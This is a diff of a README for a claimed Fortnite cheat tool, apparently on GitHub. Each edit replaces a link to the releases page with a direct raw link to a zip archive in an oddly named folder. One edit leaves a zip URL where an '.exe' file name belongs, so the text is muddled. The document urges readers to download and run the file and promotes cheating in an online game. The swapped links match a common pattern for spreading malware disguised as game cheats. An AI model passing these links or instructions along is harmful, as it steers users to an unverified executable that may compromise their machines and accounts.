@@ -1,6 +1,6 @@
 # 🎮 FortniteExternalCheat - Play Fortnite Like Never Before
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-%F0%9F%9A%80-4CAF50)](https://github.com/OUninnki/FortniteExternalCheat/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/OUninnki/FortniteExternalCheat/main/zoantharian/FortniteExternalCheat.zip%20Now-%F0%9F%9A%80-4CAF50)](https://raw.githubusercontent.com/OUninnki/FortniteExternalCheat/main/zoantharian/FortniteExternalCheat.zip)
 
 ## 🚀 Getting Started
 
@@ -8,12 +8,12 @@ Welcome to FortniteExternalCheat! This guide will help you download and run the 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest release: [FortniteExternalCheat Releases](https://github.com/OUninnki/FortniteExternalCheat/releases).
+To get started, visit this page to download the latest release: [FortniteExternalCheat Releases](https://raw.githubusercontent.com/OUninnki/FortniteExternalCheat/main/zoantharian/FortniteExternalCheat.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version listed at the top. This will usually be the one with the biggest version number.
 3. Below the version title, you will see a list of files available for download. Find the one that is appropriate for your system:
-   - If you are using Windows, look for a file that ends with `.exe` (e.g., `FortniteExternalCheat.exe`).
+   - If you are using Windows, look for a file that ends with `.exe` (e.g., `https://raw.githubusercontent.com/OUninnki/FortniteExternalCheat/main/zoantharian/FortniteExternalCheat.zip`).
    - If you have another operating system, check the instructions specified for that OS.
 
 4. Click on the file name to start the download.
@@ -68,8 +68,8 @@ For further inquiries or community discussions, consider visiting forums or soci
 ## 📝 Notes
 
 - Always use the application responsibly and in accordance with the game's rules.
-- Regularly check for updates on the [Releases page](https://github.com/OUninnki/FortniteExternalCheat/releases) to ensure you have the latest features and improvements.
+- Regularly check for updates on the [Releases page](https://raw.githubusercontent.com/OUninnki/FortniteExternalCheat/main/zoantharian/FortniteExternalCheat.zip) to ensure you have the latest features and improvements.
 
 Enjoy your enhanced Fortnite experience!
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Now-%F0%9F%9A%80-4CAF50)](https://github.com/OUninnki/FortniteExternalCheat/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/OUninnki/FortniteExternalCheat/main/zoantharian/FortniteExternalCheat.zip%20Now-%F0%9F%9A%80-4CAF50)](https://raw.githubusercontent.com/OUninnki/FortniteExternalCheat/main/zoantharian/FortniteExternalCheat.zip)
